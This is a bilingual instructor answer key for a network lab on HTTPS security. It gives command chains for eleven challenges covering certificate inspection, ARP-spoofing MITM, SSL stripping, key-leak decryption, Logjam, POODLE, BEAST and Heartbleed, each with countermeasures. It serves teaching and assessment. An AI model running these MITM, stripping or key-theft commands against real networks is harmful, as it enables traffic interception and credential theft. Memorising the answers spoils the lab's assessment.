# Instructor answer key — "HTTPS Security" lab

> 🇬🇧 English below · 🇫🇷 Version française plus bas.

**For instructor use only.** For each of the eleven challenges, this document
gives a solving chain *(a)* with **mainstream tooling** (OpenSSL, Scapy,
bettercap, mitmproxy, Wireshark, nmap, testssl.sh…) then *(b)* a **Scapy** variant
where relevant. For attacks operating on TLS records (forward secrecy, Logjam,
POODLE, BEAST, Heartbleed), Scapy's scope is stated honestly: it provides the
positioning primitive (ARP poisoning) and **capture**, but the
decryption/cryptographic oracle belongs to a dedicated tool (Wireshark, PoC) —
Scapy then serves to *carry* or *record* the bytes, not to reimplement the
cryptanalysis.

> Convention: `TARGET` = challenge target IP (172.28.0.2x/3x); `VICTIM` =
> `172.28.0.11` (victim-client); `ME` = attack host on the `lab` network.
> The Scapy scripts referenced are provided under `solutions/scapy/`.

Common prerequisite for the "with Scapy" man-in-the-middle solutions:

```sh
sudo sysctl -w net.ipv4.ip_forward=1     # relay the traffic (otherwise = DoS)
```

---

## C1 — OpenSSL warm-up (10 pts)

**Teaching vulnerability**: no network attack; manipulate an X.509 certificate.
The flag is in the *OU* field of the served self-signed certificate.

### (a) Mainstream tools — OpenSSL

```sh
openssl s_client -connect TARGET:8451 -showcerts </dev/null 2>/dev/null \
  | openssl x509 -out cert.pem
openssl x509 -in cert.pem -text -noout        # flag in the subject (OU=FLAG{...})
```

**Manual signature verification** (from the supplied OpenSSL sheet):

```sh
openssl asn1parse -in cert.pem                      # offset of the last BIT STRING
openssl asn1parse -in cert.pem -strparse <OFFSET> -out sig.bin
openssl x509 -in cert.pem -noout -pubkey > pub.pem
openssl rsautl -verify -pubin -inkey pub.pem -in sig.bin > decrypted.bin
openssl asn1parse -inform DER -in decrypted.bin     # OCTET STRING = signed hash
openssl asn1parse -in cert.pem -strparse 4 -out body.bin
openssl dgst -sha256 body.bin                        # must equal the hash above
```

### (b) With Scapy

Not relevant (no network dimension).

**Countermeasure**: RFC 5280 validation [4].

---

## C2 — Scapy warm-up (10 pts)

### (a) Mainstream tools

```sh
tcpdump -i eth0 -A udp port 8452
printf 'GIVE-FLAG' | socat - UDP-DATAGRAM:TARGET:8452,sourceport=40000
```

### (b) With Scapy *(`solutions/scapy/scapy_warmup_solve.py`)*

```python
from scapy.all import IP, UDP, Raw, sniff, sr1
sniff(filter="udp port 8452", count=1, timeout=15).summary()
rep = sr1(IP(dst="TARGET")/UDP(dport=8452, sport=40000)/Raw(b"GIVE-FLAG"), timeout=5)
print(bytes(rep[Raw].load))                          # → flag=FLAG{...}
```

---

## C3 — MITM against cleartext HTTP (20 pts)

### (a) Mainstream tools

```sh
sudo bettercap -iface eth0 -eval \
  "set arp.spoof.targets VICTIM; arp.spoof on; net.sniff on"
```

### (b) With Scapy *(`arp_spoof.py` + `sniff_http_flag.py`)*

```sh
sudo python3 solutions/scapy/arp_spoof.py --victim VICTIM --target TARGET --iface eth0 &
sudo python3 solutions/scapy/sniff_http_flag.py --port 8453 --iface eth0
```

**Countermeasure**: HTTPS + redirect + HSTS.

---

## C4 — Self-signed certificate & MITM (15 pts)

### (a) Mainstream tools

```sh
sudo bettercap -iface eth0 -eval "set arp.spoof.targets VICTIM; arp.spoof on"
mitmproxy --mode transparent --ssl-insecure --showhost
```

### (b) With Scapy

Scapy = position (`arp_spoof.py`); certificate substitution = mitmproxy.

**Countermeasure**: RFC 5280 validation [4]; pinning.

---

## C5 — Private-key leak (20 pts)

### (a) Mainstream tools

```sh
curl -k https://TARGET:8442/.well-known/backup/server.key -o server.key
curl -k https://TARGET:8442/c/5/flag-feed | jq -r .ciphertext_b64 | base64 -d > flag.bin
openssl pkeyutl -decrypt -inkey server.key \
  -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in flag.bin
```

### (b) With Scapy

Not relevant (application-layer leak).

**Countermeasure**: compartmentalize secrets; ECDHE (→ C6).

---

## C6 — No forward secrecy / RSA key exchange (25 pts)

**Vulnerability**: RSA key exchange (`kRSA`, no ECDHE). The pre-master secret is
encrypted under the server's public key. Recorded session + leaked private key →
*after-the-fact* decryption. Key exposed under `/.well-known/backup/`.

### (a) Mainstream tools — capture, leak, deferred decryption

```sh
sudo tcpdump -i eth0 -w cap.pcap 'host TARGET and tcp port 8447'        # 1) record
curl -k https://TARGET:8447/.well-known/backup/server.key -o server.key # 2) leak
tshark -r cap.pcap -o "tls.keys_list:TARGET,8447,http,server.key" -Y http \
  -T fields -e http.file_data | tr -d '\n' | xxd -r -p | grep -o 'FLAG{[^}]*}'  # 3) decrypt
# (or Wireshark: Preferences ▸ Protocols ▸ TLS ▸ RSA keys list)
```

> Works ONLY because the exchange is RSA. With ECDHE, the private key would not
> be enough — you would need the ephemeral secret, which is destroyed.

### (b) With Scapy

```python
from scapy.all import sniff, wrpcap
pkts = sniff(filter="host TARGET and tcp port 8447", timeout=60)
wrpcap("cap.pcap", pkts)     # then decrypt in Wireshark/tshark
```

**Countermeasure**: ECDHE; in TLS 1.3, RSA key exchange is removed.

---

## C7 — Logjam / DHE export (25 pts)

**Vulnerability**: the server accepts **DHE_EXPORT** suites (a **512-bit** DH
group) and does not protect against downgrade. A MITM forces the downgrade to
this group, whose discrete logarithm is **precomputable** (amortized over the
shared prime), yielding the ephemeral secret then the flag cookie [19, 20].

Arm the victim: portal → challenge 7 → *Start* → IP `VICTIM`.

### (a) Mainstream tools — detection, downgrade, decryption

```sh
# 1) DETECT that export DHE (512 bits) is accepted
testssl.sh --logjam TARGET:8448
nmap --script ssl-dh-params -p 8448 TARGET
openssl s_client -connect TARGET:8448 -cipher 'EXP' </dev/null   # establishes a 512-bit session

# 2) RECORD then force the DOWNGRADE from a MITM position (rewrite the ClientHello
#    to DHE_EXPORT; the server answers with its 512-bit group)
sudo tcpdump -i eth0 -w logjam.pcap 'host TARGET and tcp port 8448'

# 3) BREAK the 512-bit discrete log (precomputed for the known group) → ephemeral
#    secret → session keys → decrypt logjam.pcap in Wireshark.
#    In class: use the supplied PoC/table (precomputation is the crux of Logjam).
```

> **Teaching point.** The discrete-log cost on a 512-bit prime is high *once*;
> it is then reused against every server sharing that prime. The gradable exercise
> is **detection** + **demonstrating the downgrade**; full decryption relies on
> the supplied precomputation.

### (b) With Scapy

```sh
sudo python3 solutions/scapy/arp_spoof.py --victim VICTIM --target TARGET --iface eth0
# Scapy = positioning + capture (wrpcap). Rewriting the ClientHello to force
# DHE_EXPORT and breaking the discrete log belong to a dedicated PoC
# (flexible-hello / logjam) — Scapy does not implement the cryptanalysis.
```

**Countermeasure**: remove all EXPORT suites; DH groups ≥ 2048 bits (unique per
server); prefer ECDHE; on the client, reject DHE < 1024 bits.

---

## C8 — SSL stripping (20 pts)

### (a) Mainstream tools

```sh
sudo bettercap -iface eth0 -caplet hstshijack/hstshijack \
  -eval "set arp.spoof.targets VICTIM; arp.spoof on; net.sniff on"
```

### (b) With Scapy

Scapy = ARP (`arp_spoof.py`); HTTPS→HTTP rewriting = bettercap/sslstrip2.

**Countermeasure**: HSTS (RFC 6797 [6]) + *preload*.

---

## C9 — POODLE / SSL 3.0 (25 pts)

### (a) Mainstream tools

```sh
openssl s_client -connect TARGET:8444 -ssl3
nmap --script ssl-poodle -p 8444 TARGET
```

Exploitation via a POODLE PoC from a MITM position (CBC padding oracle) [10].

### (b) With Scapy

Scapy = position (ARP); the oracle is a dedicated PoC.

**Countermeasure**: disable SSLv3; `TLS_FALLBACK_SCSV` (RFC 7507 [9]).

---

## C10 — BEAST / TLS 1.0 CBC (25 pts)

### (a) Mainstream tools

```sh
openssl s_client -connect TARGET:8446 -tls1
nmap --script ssl-enum-ciphers -p 8446 TARGET
testssl.sh --protocols --cbc TARGET:8446
```

Exploitation via a BEAST PoC wired behind the Scapy position.

### (b) With Scapy

```sh
sudo python3 solutions/scapy/arp_spoof.py --victim VICTIM --target TARGET --iface eth0
# position + observing record sizes; adaptive driving = BEAST PoC
```

**Countermeasure**: ban TLS 1.0; otherwise 1/n-1 or AEAD (RFC 4346 [17]).

---

## C11 — Heartbleed / OpenSSL 1.0.1f (20 pts)

### (a) Mainstream tools

```sh
nmap -p 8445 --script ssl-heartbleed TARGET
python3 heartbleed_poc.py TARGET 8445 | strings | grep -o 'FLAG{[^}]*}'
```

### (b) With Scapy

Deliver the malformed Heartbeat request (oversized `payload_length`) via a
`StreamSocket`. In practice, a dedicated PoC; Scapy shows that the flaw comes down
to **a single unchecked length field**.

**Countermeasure**: OpenSSL ≥ 1.0.1g; regenerate exposed secrets.

---

## Answer-key summary table

| # | Challenge | "Mainstream" chain | Scapy's role |
|---|-----------|--------------------|--------------|
| 1 | OpenSSL | `s_client`/`x509`/`asn1parse`/`rsautl` | — |
| 2 | Scapy | `tcpdump` + `socat` | sniff + craft + send (core) |
| 3 | MITM HTTP | bettercap / arpspoof + tcpdump | ARP spoof + sniff (complete) |
| 4 | Self-signed | bettercap + mitmproxy | ARP position (→ TLS proxy) |
| 5 | Key leak | `curl` + `openssl pkeyutl` | — |
| 6 | Forward secrecy | tcpdump + `curl` key + Wireshark/tshark | capture (→ Wireshark decryption) |
| 7 | Logjam | testssl/nmap + downgrade + precomputed discrete log | position + capture (→ PoC + precomputation) |
| 8 | SSL strip | bettercap `hstshijack` | ARP position (→ stripping) |
| 9 | POODLE | `s_client -ssl3`, `nmap`, PoC | ARP position (→ oracle) |
| 10 | BEAST | `s_client -tls1`, `testssl.sh`, PoC | position + record measurement |
| 11 | Heartbleed | `nmap`, RFC 6520 PoC | delivering the malformed record |

---

## References

[3] R. Seggelmann *et al.*, "TLS/DTLS Heartbeat Extension", **RFC 6520**, 2012.
[4] D. Cooper *et al.*, "X.509 PKI Certificate and CRL Profile", **RFC 5280**, 2008.
[6] J. Hodges *et al.*, "HTTP Strict Transport Security", **RFC 6797**, 2012.
[9] B. Möller, A. Langley, "TLS Fallback SCSV", **RFC 7507**, 2015.
[10] B. Möller, T. Duong, K. Kotowicz, "This POODLE Bites", Google, 2014. (CVE-2014-3566)
[13] T. Duong, J. Rizzo, "Here Come The ⊕ Ninjas" (BEAST), 2011.
[14] MITRE, "CVE-2011-3389" (BEAST), 2011.
[17] T. Dierks, E. Rescorla, "TLS Protocol Version 1.1", **RFC 4346**, 2006.
[18] P. Biondi, *Scapy Documentation*, scapy.readthedocs.io.
[19] D. Adrian *et al.*, "Imperfect Forward Secrecy: How Diffie-Hellman Fails in
     Practice" (Logjam), *ACM CCS*, 2015.
[20] MITRE, "CVE-2015-4000 (Logjam)", 2015.

---

## Appendix A — Flashcards (answer key)

1. **Q:** Why does verifying a certificate's signature *by hand* teach more than
   `openssl verify`?
   **A:** You walk the ASN.1, isolate the BIT STRING, "decrypt" with the public
   key, and compare to the TBSCertificate digest (C1).

2. **Q:** The three fundamental Scapy gestures?
   **A:** Sniff (`sniff`/BPF), dissect (`pkt[layer]`), craft & send (`sr1`) (C2).

3. **Q:** In C6, why does the private key decrypt a *past* capture, and when would
   it fail?
   **A:** RSA key exchange encrypts the pre-master secret under that key; with
   ECDHE, you would need the ephemeral secret (destroyed) → failure.

4. **Q:** In C7 (Logjam), what exactly is exploited if DHE is *ephemeral*?
   **A:** The **group** weakness (512-bit, EXPORT) and the lack of downgrade
   protection; the precomputed discrete log yields the ephemeral secret (C7).

5. **Q:** Why does precomputation make Logjam practical despite the discrete-log
   cost?
   **A:** The cost is paid *once* per prime, then amortized over every server
   sharing that same prime (C7).

6. **Q:** Which single countermeasure covers both C6 AND C7?
   **A:** **Robust** ephemerals: ECDHE, or unique DH ≥ 2048 bits; and no EXPORT
   suites.

7. **Q:** How far does Scapy go on a TLS attack (C6, C7, POODLE, BEAST)?
   **A:** Position (ARP) + capture; decryption/oracle/discrete log = a dedicated
   tool (Wireshark, PoC, precomputation).

8. **Q:** What makes the IV predictable in TLS 1.0 and closes BEAST in 1.1?
   **A:** IV = the previous record's last ciphertext block; TLS 1.1 mandates an
   explicit IV (C10).

9. **Q:** Heartbleed: protocol or implementation flaw?
   **A:** Implementation — an unbounded length field (RFC 6520) over-reads memory
   (C11).

## Appendix B — Acronym glossary (answer-key additions)

| Acronym | Expansion | Explanation |
|---------|-----------|-------------|
| **PFS** | *Perfect Forward Secrecy* | The leak of a long-term key does not compromise past sessions (C6, C7). |
| **kRSA** | *(key exchange) RSA* | TLS suites where the pre-master secret is encrypted under the server's RSA key (C6). |
| **DH** | *Diffie-Hellman* | Exchange based on the discrete logarithm; a 512-bit group is breakable (C7). |
| **DHE** | *Diffie-Hellman Ephemeral* | Ephemeral (PFS if the group is robust); downgraded to EXPORT in Logjam (C7). |
| **ECDHE** | *Elliptic Curve DH Ephemeral* | Ephemeral over an elliptic curve; countermeasure for C6/C7. |
| **EXPORT** | *EXPORT (suites)* | Weakened suites (≤ 512 bits) inherited from US regulation; basis of Logjam/FREAK [19]. |
| **PRF** | *Pseudo-Random Function* | Expansion function deriving the session keys from the pre-master secret. |
| **IV** | *Initialization Vector* | CBC seeding block; its predictability underlies BEAST (C10). |
| **BEAST** | *Browser Exploit Against SSL/TLS* | Chosen-plaintext attack on TLS 1.0/CBC (CVE-2011-3389) [13, 14]. |
| **AEAD** | *Authenticated Encryption with Associated Data* | Authenticated encryption (AES-GCM) with no CBC oracle. |
| **BPF** | *Berkeley Packet Filter* | Capture filtering language (`sniff`/`tcpdump`). |
| **TBS** | *To Be Signed (Certificate)* | The actually-signed body of the certificate (compared in C1). |
| **ARP** | *Address Resolution Protocol* | IP↔MAC resolution; its hijacking positions the MITM (RFC 826 [15]). |
| **DoS** | *Denial of Service* | Effect of ARP spoofing without IP forwarding enabled. |
| **PoC** | *Proof of Concept* | Exploitation demonstration code (Logjam, POODLE, BEAST, Heartbleed). |

---
*Teaching answer key — ANSSI / CFSSI. Do not distribute to learners before the
assessment.*


<br>

---

# 🇫🇷 Version française

# Corrigé instructeur — TP « Sécurité HTTPS »

**Usage réservé à l'enseignant.** Ce document donne, pour chacun des onze
challenges, une chaîne de résolution *(a)* avec l'**outillage grand public**
(OpenSSL, Scapy, bettercap, mitmproxy, Wireshark, nmap, testssl.sh…) puis *(b)*
une variante **avec Scapy** lorsque celle-ci est pertinente. Pour les attaques
opérant sur les enregistrements TLS (forward secrecy, Logjam, POODLE, BEAST,
Heartbleed), on précise honnêtement le périmètre de Scapy : il fournit la
primitive de mise en position (empoisonnement ARP) et la **capture**, mais le
déchiffrement/oracle cryptographique relève d'un outil dédié (Wireshark, PoC) —
Scapy sert alors à *acheminer* ou *enregistrer* les octets, non à réimplémenter la
cryptanalyse.

> Convention : `CIBLE` = IP de la cible du challenge (172.28.0.2x/3x) ; `VICTIME`
> = `172.28.0.11` (client-victime) ; `MOI` = poste d'attaque sur le réseau `lab`.
> Les scripts Scapy cités sont fournis sous `solutions/scapy/`.

Prérequis communs aux corrections « avec Scapy » en position d'homme-du-milieu :

```sh
sudo sysctl -w net.ipv4.ip_forward=1     # relayer le trafic (sinon = DoS)
```

---

## C1 — Prise en main d'OpenSSL (10 pts)

**Vulnérabilité pédagogique** : aucune attaque réseau ; manipuler un certificat
X.509. Le flag est dans le champ *OU* du certificat auto-signé servi.

### (a) Outils grand public — OpenSSL

```sh
openssl s_client -connect CIBLE:8451 -showcerts </dev/null 2>/dev/null \
  | openssl x509 -out cert.pem
openssl x509 -in cert.pem -text -noout        # flag dans le sujet (OU=FLAG{...})
```

Vérification **manuelle de la signature** (d'après la fiche OpenSSL fournie) :

```sh
openssl asn1parse -in cert.pem                      # offset du dernier BIT STRING
openssl asn1parse -in cert.pem -strparse <OFFSET> -out sig.bin
openssl x509 -in cert.pem -noout -pubkey > pub.pem
openssl rsautl -verify -pubin -inkey pub.pem -in sig.bin > decrypted.bin
openssl asn1parse -inform DER -in decrypted.bin     # OCTET STRING = hash signé
openssl asn1parse -in cert.pem -strparse 4 -out body.bin
openssl dgst -sha256 body.bin                        # doit égaler le hash ci-dessus
```

### (b) Avec Scapy

Non pertinent (pas de dimension réseau).

**Contre-mesure** : validation RFC 5280 [4].

---

## C2 — Prise en main de Scapy (10 pts)

### (a) Outils grand public

```sh
tcpdump -i eth0 -A udp port 8452
printf 'GIVE-FLAG' | socat - UDP-DATAGRAM:CIBLE:8452,sourceport=40000
```

### (b) Avec Scapy *(`solutions/scapy/scapy_warmup_solve.py`)*

```python
from scapy.all import IP, UDP, Raw, sniff, sr1
sniff(filter="udp port 8452", count=1, timeout=15).summary()
rep = sr1(IP(dst="CIBLE")/UDP(dport=8452, sport=40000)/Raw(b"GIVE-FLAG"), timeout=5)
print(bytes(rep[Raw].load))                          # → flag=FLAG{...}
```

---

## C3 — MITM contre HTTP en clair (20 pts)

### (a) Outils grand public

```sh
sudo bettercap -iface eth0 -eval \
  "set arp.spoof.targets VICTIME; arp.spoof on; net.sniff on"
```

### (b) Avec Scapy *(`arp_spoof.py` + `sniff_http_flag.py`)*

```sh
sudo python3 solutions/scapy/arp_spoof.py --victim VICTIME --target CIBLE --iface eth0 &
sudo python3 solutions/scapy/sniff_http_flag.py --port 8453 --iface eth0
```

**Contre-mesure** : HTTPS + redirection + HSTS.

---

## C4 — Certificat auto-signé & MITM (15 pts)

### (a) Outils grand public

```sh
sudo bettercap -iface eth0 -eval "set arp.spoof.targets VICTIME; arp.spoof on"
mitmproxy --mode transparent --ssl-insecure --showhost
```

### (b) Avec Scapy

Scapy = position (`arp_spoof.py`) ; substitution de certificat = mitmproxy.

**Contre-mesure** : validation RFC 5280 [4] ; épinglage.

---

## C5 — Fuite de clé privée (20 pts)

### (a) Outils grand public

```sh
curl -k https://CIBLE:8442/.well-known/backup/server.key -o server.key
curl -k https://CIBLE:8442/c/5/flag-feed | jq -r .ciphertext_b64 | base64 -d > flag.bin
openssl pkeyutl -decrypt -inkey server.key \
  -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in flag.bin
```

### (b) Avec Scapy

Non pertinent (fuite applicative).

**Contre-mesure** : cloisonner les secrets ; ECDHE (→ C6).

---

## C6 — Absence de forward secrecy / échange RSA (25 pts)

**Vulnérabilité** : échange de clés RSA (`kRSA`, aucun ECDHE). Le secret
pré-maître est chiffré sous la clé publique du serveur. Session enregistrée + clé
privée fuitée → déchiffrement *a posteriori*. Clé exposée sous
`/.well-known/backup/`.

### (a) Outils grand public — capture, fuite, déchiffrement différé

```sh
sudo tcpdump -i eth0 -w cap.pcap 'host CIBLE and tcp port 8447'        # 1) enregistrer
curl -k https://CIBLE:8447/.well-known/backup/server.key -o server.key # 2) faire fuiter
tshark -r cap.pcap -o "tls.keys_list:CIBLE,8447,http,server.key" -Y http \
  -T fields -e http.file_data | tr -d '\n' | xxd -r -p | grep -o 'FLAG{[^}]*}'  # 3) déchiffrer
# (ou Wireshark : Preferences ▸ Protocols ▸ TLS ▸ RSA keys list)
```

> Ne fonctionne QUE parce que l'échange est RSA. Avec ECDHE, la clé privée ne
> suffirait pas — il faudrait le secret éphémère, détruit.

### (b) Avec Scapy

```python
from scapy.all import sniff, wrpcap
pkts = sniff(filter="host CIBLE and tcp port 8447", timeout=60)
wrpcap("cap.pcap", pkts)     # déchiffrement ensuite dans Wireshark/tshark
```

**Contre-mesure** : ECDHE ; en TLS 1.3, échange RSA supprimé.

---

## C7 — Logjam / DHE export (25 pts)

**Vulnérabilité** : le serveur accepte des suites **DHE_EXPORT** (groupe DH de
**512 bits**) et ne se protège pas du downgrade. Un MITM force la rétrogradation
vers ce groupe, dont le logarithme discret est **précalculable** (amorti sur le
premier partagé), ce qui livre le secret éphémère puis le cookie de flag [19, 20].

Armer la victime : portail → challenge 7 → *Démarrer* → IP `VICTIME`.

### (a) Outils grand public — détection, downgrade, déchiffrement

```sh
# 1) DÉTECTER l'acceptation d'un DHE export (512 bits)
testssl.sh --logjam CIBLE:8448
nmap --script ssl-dh-params -p 8448 CIBLE
openssl s_client -connect CIBLE:8448 -cipher 'EXP' </dev/null   # établit une session 512 bits

# 2) ENREGISTRER puis forcer le DOWNGRADE en position MITM (réécriture du ClientHello
#    vers la suite DHE_EXPORT ; le serveur répond avec son groupe de 512 bits)
sudo tcpdump -i eth0 -w logjam.pcap 'host CIBLE and tcp port 8448'

# 3) CASSER le log discret 512 bits (précalculé pour le groupe connu) → secret
#    éphémère → clés de session → déchiffrement de logjam.pcap dans Wireshark.
#    En séance : utiliser le PoC/table fournis (le précalcul est la clé de Logjam).
```

> **Point pédagogique.** Le coût du log discret sur un premier de 512 bits est
> élevé *une seule fois* ; il est ensuite réutilisé contre tout serveur partageant
> ce premier. L'exercice évaluable est la **détection** + la **démonstration du
> downgrade** ; le déchiffrement complet s'appuie sur le précalcul fourni.

### (b) Avec Scapy

```sh
sudo python3 solutions/scapy/arp_spoof.py --victim VICTIME --target CIBLE --iface eth0
# Scapy = mise en position + capture (wrpcap). La réécriture du ClientHello pour
# imposer DHE_EXPORT et le cassage du log discret relèvent d'un PoC dédié
# (flexible-hello / logjam) — Scapy n'implémente pas la cryptanalyse.
```

**Contre-mesure** : supprimer toutes les suites EXPORT ; groupes DH ≥ 2048 bits
(uniques par serveur) ; préférer ECDHE ; côté client, refuser DHE < 1024 bits.

---

## C8 — SSL stripping (20 pts)

### (a) Outils grand public

```sh
sudo bettercap -iface eth0 -caplet hstshijack/hstshijack \
  -eval "set arp.spoof.targets VICTIME; arp.spoof on; net.sniff on"
```

### (b) Avec Scapy

Scapy = ARP (`arp_spoof.py`) ; réécriture HTTPS→HTTP = bettercap/sslstrip2.

**Contre-mesure** : HSTS (RFC 6797 [6]) + *preload*.

---

## C9 — POODLE / SSL 3.0 (25 pts)

### (a) Outils grand public

```sh
openssl s_client -connect CIBLE:8444 -ssl3
nmap --script ssl-poodle -p 8444 CIBLE
```

Exploitation via PoC POODLE en position MITM (oracle de padding CBC) [10].

### (b) Avec Scapy

Scapy = position (ARP) ; l'oracle est un PoC dédié.

**Contre-mesure** : désactiver SSLv3 ; `TLS_FALLBACK_SCSV` (RFC 7507 [9]).

---

## C10 — BEAST / TLS 1.0 CBC (25 pts)

### (a) Outils grand public

```sh
openssl s_client -connect CIBLE:8446 -tls1
nmap --script ssl-enum-ciphers -p 8446 CIBLE
testssl.sh --protocols --cbc CIBLE:8446
```

Exploitation via PoC BEAST branché derrière la position Scapy.

### (b) Avec Scapy

```sh
sudo python3 solutions/scapy/arp_spoof.py --victim VICTIME --target CIBLE --iface eth0
# position + observation des tailles de records ; pilotage adaptatif = PoC BEAST
```

**Contre-mesure** : bannir TLS 1.0 ; sinon 1/n-1 ou AEAD (RFC 4346 [17]).

---

## C11 — Heartbleed / OpenSSL 1.0.1f (20 pts)

### (a) Outils grand public

```sh
nmap -p 8445 --script ssl-heartbleed CIBLE
python3 heartbleed_poc.py CIBLE 8445 | strings | grep -o 'FLAG{[^}]*}'
```

### (b) Avec Scapy

Acheminer la requête Heartbeat malformée (`payload_length` surdimensionné) via un
`StreamSocket`. En pratique, PoC dédié ; Scapy montre que la faille tient à **un
seul champ de longueur** non contrôlé.

**Contre-mesure** : OpenSSL ≥ 1.0.1g ; régénérer les secrets exposés.

---

## Tableau récapitulatif des corrections

| # | Challenge | Chaîne « grand public » | Rôle de Scapy |
|---|-----------|-------------------------|---------------|
| 1 | OpenSSL | `s_client`/`x509`/`asn1parse`/`rsautl` | — |
| 2 | Scapy | `tcpdump` + `socat` | sniff + forge + send (cœur) |
| 3 | MITM HTTP | bettercap / arpspoof + tcpdump | ARP spoof + sniff (complet) |
| 4 | Auto-signé | bettercap + mitmproxy | position ARP (→ proxy TLS) |
| 5 | Fuite de clé | `curl` + `openssl pkeyutl` | — |
| 6 | Forward secrecy | tcpdump + `curl` clé + Wireshark/tshark | capture (→ déchiffrement Wireshark) |
| 7 | Logjam | testssl/nmap + downgrade + log discret précalculé | position + capture (→ PoC + précalcul) |
| 8 | SSL strip | bettercap `hstshijack` | position ARP (→ stripping) |
| 9 | POODLE | `s_client -ssl3`, `nmap`, PoC | position ARP (→ oracle) |
| 10 | BEAST | `s_client -tls1`, `testssl.sh`, PoC | position + mesure des records |
| 11 | Heartbleed | `nmap`, PoC RFC 6520 | acheminement du record malformé |

---

## Références

[3] R. Seggelmann *et al.*, « TLS/DTLS Heartbeat Extension », **RFC 6520**, 2012.
[4] D. Cooper *et al.*, « X.509 PKI Certificate and CRL Profile », **RFC 5280**, 2008.
[6] J. Hodges *et al.*, « HTTP Strict Transport Security », **RFC 6797**, 2012.
[9] B. Möller, A. Langley, « TLS Fallback SCSV », **RFC 7507**, 2015.
[10] B. Möller, T. Duong, K. Kotowicz, « This POODLE Bites », Google, 2014. (CVE-2014-3566)
[13] T. Duong, J. Rizzo, « Here Come The ⊕ Ninjas » (BEAST), 2011.
[14] MITRE, « CVE-2011-3389 » (BEAST), 2011.
[17] T. Dierks, E. Rescorla, « TLS Protocol Version 1.1 », **RFC 4346**, 2006.
[18] P. Biondi, *Scapy Documentation*, scapy.readthedocs.io.
[19] D. Adrian *et al.*, « Imperfect Forward Secrecy: How Diffie-Hellman Fails in
     Practice » (Logjam), *ACM CCS*, 2015.
[20] MITRE, « CVE-2015-4000 (Logjam) », 2015.

---

## Annexe A — Flashcards (corrigé)

1. **Q :** Pourquoi vérifier *manuellement* la signature d'un certificat apprend-il
   plus que `openssl verify` ?
   **R :** On parcourt l'ASN.1, on isole le BIT STRING, on « déchiffre » par la clé
   publique et on compare au condensat du TBSCertificate (C1).

2. **Q :** Les trois gestes fondamentaux de Scapy ?
   **R :** Renifler (`sniff`/BPF), disséquer (`pkt[couche]`), forger & émettre
   (`sr1`) (C2).

3. **Q :** Au C6, pourquoi la clé privée déchiffre-t-elle une capture *passée*, et
   quand échouerait-elle ?
   **R :** L'échange RSA chiffre le secret pré-maître sous cette clé ; avec ECDHE,
   il faudrait le secret éphémère (détruit) → échec.

4. **Q :** Au C7 (Logjam), qu'exploite-t-on exactement si DHE est *éphémère* ?
   **R :** La faiblesse du **groupe** (512 bits, EXPORT) et l'absence de protection
   au downgrade ; le log discret précalculé livre le secret éphémère (C7).

5. **Q :** Pourquoi le précalcul rend-il Logjam pratique malgré le coût du log
   discret ?
   **R :** Le coût est payé *une fois* par premier, puis amorti sur tous les
   serveurs partageant ce même premier (C7).

6. **Q :** Quelle contre-mesure unique couvre C6 ET C7 ?
   **R :** Des éphémères **robustes** : ECDHE, ou DH ≥ 2048 bits uniques ; et pas de
   suites EXPORT.

7. **Q :** Jusqu'où va Scapy sur une attaque TLS (C6, C7, POODLE, BEAST) ?
   **R :** Position (ARP) + capture ; déchiffrement/oracle/log discret = outil dédié
   (Wireshark, PoC, précalcul).

8. **Q :** Qu'est-ce qui rend l'IV prévisible en TLS 1.0 et referme BEAST en 1.1 ?
   **R :** IV = dernier bloc chiffré du record précédent ; TLS 1.1 impose un IV
   explicite (C10).

9. **Q :** Heartbleed : faille de protocole ou d'implémentation ?
   **R :** D'implémentation — un champ de longueur non borné (RFC 6520) sur-lit la
   mémoire (C11).

## Annexe B — Glossaire des acronymes (compléments du corrigé)

| Acronyme | Développé | Explication |
|----------|-----------|-------------|
| **PFS** | *Perfect Forward Secrecy* | La fuite d'une clé long-terme ne compromet pas les sessions passées (C6, C7). |
| **kRSA** | *(key exchange) RSA* | Suites TLS où le secret pré-maître est chiffré sous la clé RSA du serveur (C6). |
| **DH** | *Diffie-Hellman* | Échange fondé sur le logarithme discret ; un groupe de 512 bits est cassable (C7). |
| **DHE** | *Diffie-Hellman Ephemeral* | Éphémère (PFS si groupe robuste) ; rétrogradé en EXPORT dans Logjam (C7). |
| **ECDHE** | *Elliptic Curve DH Ephemeral* | Éphémère sur courbe elliptique ; contre-mesure de C6/C7. |
| **EXPORT** | *(suites) EXPORT* | Suites bridées (≤ 512 bits) héritées de la réglementation US ; base de Logjam/FREAK [19]. |
| **PRF** | *Pseudo-Random Function* | Fonction d'expansion dérivant les clés de session du secret pré-maître. |
| **IV** | *Initialization Vector* | Bloc d'amorçage CBC ; sa prévisibilité fonde BEAST (C10). |
| **BEAST** | *Browser Exploit Against SSL/TLS* | Attaque chosen-plaintext sur TLS 1.0/CBC (CVE-2011-3389) [13, 14]. |
| **AEAD** | *Authenticated Encryption with Associated Data* | Chiffrement authentifié (AES-GCM) sans oracle CBC. |
| **BPF** | *Berkeley Packet Filter* | Langage de filtrage de capture (`sniff`/`tcpdump`). |
| **TBS** | *To Be Signed (Certificate)* | Corps du certificat effectivement signé (comparé au C1). |
| **ARP** | *Address Resolution Protocol* | Résolution IP↔MAC ; son détournement positionne le MITM (RFC 826 [15]). |
| **DoS** | *Denial of Service* | Effet d'un ARP spoofing sans routage IP activé. |
| **PoC** | *Proof of Concept* | Code de démonstration d'exploitation (Logjam, POODLE, BEAST, Heartbleed). |

---
*Corrigé à usage pédagogique — ANSSI / CFSSI. Ne pas diffuser aux apprenants
avant l'évaluation.*
